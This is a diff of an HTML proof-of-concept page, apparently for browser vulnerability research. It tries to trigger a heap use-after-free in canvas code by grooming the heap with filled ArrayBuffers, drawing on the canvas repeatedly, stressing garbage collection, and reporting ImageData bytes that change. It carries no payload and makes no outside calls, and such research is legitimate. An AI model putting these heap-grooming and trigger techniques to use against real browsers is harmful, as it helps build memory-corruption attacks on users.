@@ -2,11 +2,11 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Canvas UAF PoC v3</title>
+    <title>Canvas UAF PoC v4</title>
     <style>
         #trigger {
             margin: 20px;
-            padding: 12px;
+            padding: 8px;
             font-size: 16px;
             cursor: pointer;
             background-color: #f44336;
@@ -17,86 +17,134 @@
         #trigger:hover {
             background-color: #d32f2f;
         }
+        #canvas {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <h1>Canvas UAF PoC v3</h1>
-    <p>Click to trigger UAF in CanvasBase::setImageBuffer.</p>
+    <h1>Canvas Heap Use-After-Free PoC</h1>
+    <p>Click to trigger UAF in CanvasBase.</p>
     <button id="trigger">Trigger UAF</button>
-    <canvas id="canvas" width="100" height="100"></canvas>
+    <canvas id="canvas" width="320" height="320"></canvas>
     <script>
-        function setupMemoryCheck() {
-            const buffers = [];
-            for (let i = 0; i < 100; i++) {
-                const buf = new ArrayBuffer(2048); // 2KB
-                const view = new Uint8Array(buf);
-                view.fill(0x46); // Fill with 0x46
-                buffers.push(view);
-            }
-            return () => {
-                let changes = [];
-                for (let b = 0; b < buffers.length; b++) {
-                    for (let i = 0; i < buffers[b].length; i++) {
-                        if (buffers[b][i] !== 0x46) {
-                            changes.push(`Buffer[${b}][0x${i.toString(16)}]: 0x${buffers[b][i].toString(16)}`);
-                        }
-                    }
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        let attemptCount = 0;
+
+        function stressGC() {
+            try {
+                for (let i = 0; i < 200; i++) {
+                    new ArrayBuffer(512 * 1024); // 512KB
                 }
-                return changes.length ? changes.join(', ') : 'No changes';
-            };
+                for (let i = 0; i < 10; i++) {
+                    new ArrayBuffer(1024 * 1024); // 1MB
+                }
+            } catch (e) {
+                alert(`GC stress error: ${e.message}`);
+            }
         }
 
-        document.getElementById('trigger').addEventListener('click', () => {
-            alert('Initiating PoC...');
+        function drawOnCanvas() {
             try {
+                ctx.fillStyle = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                ctx.beginPath();
+                ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, 50, 0, 2 * Math.PI);
+                ctx.fill();
+                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                for (let i = 0; i < imageData.data.length; i++) {
+                    imageData.data[i] = Math.random() * 100;
+                }
+                ctx.putImageData(imageData, 0, 0);
+            } catch (e) {
+                alert(`Draw error: ${e.message}`);
+            }
+        }
+
+        function checkImageDataUAF(imageData) {
+            try {
+                const original = new Uint8Array(imageData.data.buffer);
+                const originalCopy = new Uint8Array(original);
+                ctx.putImageData(imageData, 0, 0);
+                const current = new Uint8Array(ctx.getImageData(0, 0, canvas.width, canvas.height).data.buffer);
+                let differenceCount = 0;
+                let startOffset = -1;
+                let endOffset = -1;
+                const changes = new Map();
+
+                for (let i = 0; i < Math.min(original.length, 4096); i++) {
+                    if (originalCopy[i] !== current[i]) {
+                        differenceCount++;
+                        const key = `0x${originalCopy[i].toString(16).padStart(2, '0')}->0x${current[i].toString(16).padStart(2, '0')}`;
+                        changes.set(key, (changes.get(key) || 0) + 1);
+                        if (startOffset === -1) startOffset = i;
+                        endOffset = i;
+                    }
+                }
+
+                const range = (startOffset !== -1 && endOffset !== -1) ? { start: startOffset, end: endOffset } : null;
+                return { detected: differenceCount > 0, differenceCount, range, changes: [...changes], error: null };
+            } catch (e) {
+                return { detected: true, differenceCount: 0, range: null, changes: [], error: e.message };
+            }
+        }
+
+        async function detectUAF() {
+            attemptCount++;
+            alert(`Attempt ${attemptCount} started`);
+
+            try {
+                // Create reference ImageData
+                const refImageData = ctx.createImageData(320, 256);
+                const refView = new Uint8Array(refImageData.data.buffer);
+                for (let i = 0; i < refView.length; i++) {
+                    refView[i] = 0x46;
+                }
+
                 // Heap grooming
-                alert('Grooming heap with 100x128KB buffers...');
+                alert('Grooming heap with 50x128KB buffers...');
                 const groom = [];
-                for (let i = 0; i < 100; i++) {
-                    const buf = new ArrayBuffer(128 * 1024); // 128KB
+                for (let i = 0; i < 50; i++) {
+                    const buf = new ArrayBuffer(128 * 1024);
                     const view = new Uint8Array(buf);
                     view.fill(0x41);
                     groom.push(view);
                 }
 
-                // Initialize memory checker
-                const check = setupMemoryCheck();
-                alert('Memory checker initialized (100x2KB buffers with 0x46).');
+                // Intensive drawing
+                alert('Starting intensive drawing...');
+                const drawInterval = setInterval(drawOnCanvas, 1);
 
-                // Create canvas and context
-                alert('Creating canvas and context...');
-                const canvas = document.getElementById('canvas');
-                const ctx = canvas.getContext('2d');
+                // Check for UAF
+                setTimeout(async () => {
+                    const result = checkImageDataUAF(refImageData);
+                    clearInterval(drawInterval);
 
-                // Create ImageData
-                alert('Creating ImageData...');
-                const imageData = ctx.createImageData(100, 100);
-                const data = imageData.data;
-                data.fill(0xFF); // Fill with known value
-
-                setTimeout(() => {
-                    try {
-                        // Check memory before manipulation
-                        const before = check();
-                        alert(`Memory before manipulation: ${before}`);
-
-                        // Attempt to trigger UAF
-                        alert('Attempting to trigger UAF with putImageData...');
-                        for (let i = 0; i < 100; i++) {
-                            ctx.putImageData(imageData, 0, 0); // Repeated calls
-                            const tempData = ctx.createImageData(50, 50); // Allocate more
-                            tempData.data.fill(0x48); // Try to overwrite
+                    if (result.detected) {
+                        alert(`UAF detected!\n${result.error ? `Error: ${result.error}` : `${result.differenceCount} bytes changed${result.range ? `\nRange: ${result.range.start}-${result.range.end}\nChanges: ${result.changes.map(([k, v]) => `${k} (${v} bytes)`).join(', ')}` : ''}`}`);
+                    } else {
+                        alert('No UAF detected, stressing GC...');
+                        stressGC();
+                        await new Promise(resolve => setTimeout(resolve, 10));
+                        const secondResult = checkImageDataUAF(refImageData);
+                        if (secondResult.detected) {
+                            alert(`UAF detected after GC!\n${secondResult.error ? `Error: ${secondResult.error}` : `${secondResult.differenceCount} bytes changed${secondResult.range ? `\nRange: ${secondResult.range.start}-${secondResult.range.end}\nChanges: ${secondResult.changes.map(([k, v]) => `${k} (${v} bytes)`).join(', ')}` : ''}`}`);
+                        } else {
+                            alert('No UAF detected');
                         }
-
-                        // Check memory after
-                        const after = check();
-                        alert(`Memory after manipulation: ${after}`);
-                    } catch (err) {
-                        alert(`Error: ${err.message}`);
                     }
-                }, 600);
+                }, 150);
             } catch (err) {
-                alert(`Initial error: ${err.message}`);
+                alert(`Error: ${err.message}`);
+            }
+        }
+
+        document.getElementById('trigger').addEventListener('click', async () => {
+            try {
+                await detectUAF();
+            } catch (err) {
+                alert(`Error: ${err.message}`);
             }
         });
     </script>
